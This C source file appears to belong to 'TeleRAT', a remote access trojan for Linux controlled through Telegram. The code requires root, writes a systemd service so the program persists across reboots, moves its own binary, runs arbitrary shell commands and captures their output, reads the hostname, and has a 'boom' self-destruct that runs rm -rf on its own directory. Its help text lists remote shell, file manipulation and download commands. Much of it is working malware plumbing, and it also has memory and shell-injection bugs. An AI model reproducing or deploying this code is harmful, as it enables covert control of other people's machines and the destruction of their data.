#include "util.h"

//Check is this program run as root or not
void i_am_root(){
    if(getuid() != 0){
        printf("\nI'm not ROOOOOOT!.\n(Please Run with Sudo or ROOT)\n\n");
        exit(1);
    }
}

//get Program Name
void getpName(char *pName){
    unsigned int len = strlen(pName);
    //parse ./move -> /move
    strncpy(pName,pName+1,len-1);
    //add null byte for stop string
    pName[len-1] ='\0';
}

//Get Now file location
void getNowPath(char *nowPath){

    if (getcwd(nowPath, 1024) == NULL)
       perror("getcwd() error");
}
void exeCMD(char *cmd){
    char exec_handle[5000];
    sprintf(exec_handle,"timeout 10 %s 1>result.txt 2>error.txt",cmd);
    FILE *fp = popen(exec_handle, "r");
    pclose(fp);
}

void initSetiing(char *path,char *pName){
    struct cmd_struct cmd;

	//Connect path with program	
	sprintf(cmd.cmd,"%s%s",path,pName);
	
	//writing in /etc/systemd/system
	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","w");
	if(f == NULL)
	{
	   printf("Error can't open file");
	   exit(1);
	}
    char *text = malloc(sizeof(cmd.cmd));
	
	sprintf(text,"[Unit]\n"
		"Description = TeleRAT Remote Administrator Via Telegram\n\n"
        "[Service]\n"
	    "ExecStart = %s\n\n"
		"[Install]\n"
	    "WantedBy=multi-user.target\n\n",cmd.cmd);
    printf("%s",text);
	fprintf(f,"%s",text);
    free(text);
    bzero(cmd.cmd,sizeof(cmd.cmd));
}

//parse path to command
void move(char *path, char *pName){
    struct cmd_struct cmd;
     //Get now program location
    getNowPath(cmd.nowPath);

    printf("%s",cmd.nowPath);


    //parse path to cmd
    sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,pName,path,pName);
    // printf("%s",cmd.cmd);
    exeCMD(cmd.cmd);
    exeCMD("rm -rf /etc/systemd/system/TeleRAT.service");
    bzero(cmd.cmd,sizeof(cmd.cmd));
    initSetiing("/",pName);
}

void boom(char *path,char *pName){
    struct cmd_struct cmd;
    getNowPath(cmd.nowPath);
    getpName(pName);
    sprintf(cmd.cmd,"rm -rf %s",cmd.nowPath);
    exeCMD(cmd.cmd);
}

char *help(){
    return  "/help - List of commands\n"
            "/list - Show all avaliable clientst\n"
            "/select - Select the client by id\n"
            "/shell - Exec shell commands with timeout\n"
            "/cp - Copy file/folder\n"
            "/mv - Move file/folder\n"
            "/rm - Remove file/folder\n"
            "/mkdir - Make directory\n"
            "/getfile - Download file from bot\n"
            "/boom - DESTROY ITSELF!\n";
}


void getHostname(char *hostname){
    //Get hostname from this computer
    FILE *fp;
    fp = fopen("/etc/hostname","r");
    while (fgets(hostname, 1000, fp) != NULL)
    {
        // printf("%s", hostname);
    }
    for(int i=0;i<strlen(hostname);i++){
        if(hostname[i] == '\n'){
            hostname[i] = '\0';
        }
    }
    fclose(fp);
}

